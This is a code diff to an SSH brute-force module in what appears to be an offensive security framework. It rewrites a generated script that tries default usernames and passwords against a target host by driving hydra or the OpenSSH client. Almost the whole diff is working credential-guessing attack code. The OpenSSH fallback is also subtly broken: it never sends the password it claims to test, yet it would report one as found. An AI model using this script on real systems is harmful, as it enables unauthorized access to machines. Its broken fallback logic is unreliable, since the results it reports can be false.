@@ -23,26 +23,58 @@ class SSHBruteForce(AttackModule):
         }
 
     def generate_python_script(self, ctx: ModuleContext) -> str:
-        return f"""import paramiko, sys, itertools, time
+        # Phase 2: `paramiko` is NOT a declared dependency (requirements.txt /
+        # pyproject.toml) -- the old script died with ModuleNotFoundError on a
+        # fresh install before attempting a single login. Rewritten with
+        # stdlib only: on Linux it drives `hydra` (the Kali arsenal) and parses
+        # its success lines; on Windows (no hydra) it falls back to the
+        # OpenSSH client with BatchMode (no password prompt hang).
+        return f"""import sys, subprocess, itertools, time, platform, json
 host = sys.argv[1] if len(sys.argv) > 1 else "{ctx.target_ip}"
 port = int(sys.argv[2]) if len(sys.argv) > 2 else 22
 users = ["root", "admin", "user", "test", "guest", "ubuntu", "pi"]
 passwords = ["root", "admin", "password", "123456", "ubuntu", "raspberry", "toor", "guest"]
 found = []
-for u, p in itertools.product(users, passwords):
+
+if platform.system() != "Windows" and subprocess.run(["which", "hydra"], capture_output=True).returncode == 0:
+    # Linux attacker: drive hydra (already the suggested_command) and parse
+    # its success lines: "[22][ssh] login: root password: toor"
+    import tempfile, os
+    with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as fu, \\
+         tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as fp:
+        fu.write("\\n".join(users)); fp.write("\\n".join(passwords))
+        uf, pf = fu.name, fp.name
     try:
-        client = paramiko.SSHClient()
-        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        client.connect(host, port=port, username=u, password=p, timeout=5, banner_timeout=5, auth_timeout=5)
-        found.append((u, p))
-        client.close()
-        break
-    except paramiko.AuthenticationException:
-        pass
-    except Exception:
-        pass
+        proc = subprocess.run(
+            ["hydra", "-t", "4", "-V", "-f", "-L", uf, "-P", pf, f"ssh://{{host}}:{{port}}"],
+            capture_output=True, text=True, timeout=300,
+        )
+        for line in proc.stdout.splitlines():
+            if "[ssh]" in line and "login:" in line and "password:" in line:
+                parts = line.split()
+                u = parts[parts.index("login:") + 1]
+                p = parts[parts.index("password:") + 1]
+                found.append((u, p))
+                break
     finally:
-        time.sleep(0.5)
+        os.unlink(uf); os.unlink(pf)
+else:
+    # Windows attacker (or no hydra): stdlib OpenSSH client, BatchMode so a
+    # wrong password fails fast instead of prompting. Jittered 0.5s delay.
+    import random
+    for u, p in itertools.product(users, passwords):
+        try:
+            proc = subprocess.run(
+                ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "BatchMode=yes",
+                 "-o", "ConnectTimeout=5", "-p", str(port), f"{{u}}@{{host}}", "id"],
+                capture_output=True, text=True, timeout=15,
+            )
+            if proc.returncode == 0:
+                found.append((u, p))
+                break
+        except Exception:
+            pass
+        time.sleep(0.5 * (1 + random.random() * 0.5))
 if found:
     print(f"SUCCESS: {{found[0][0]}} / {{found[0][1]}}")
 else:
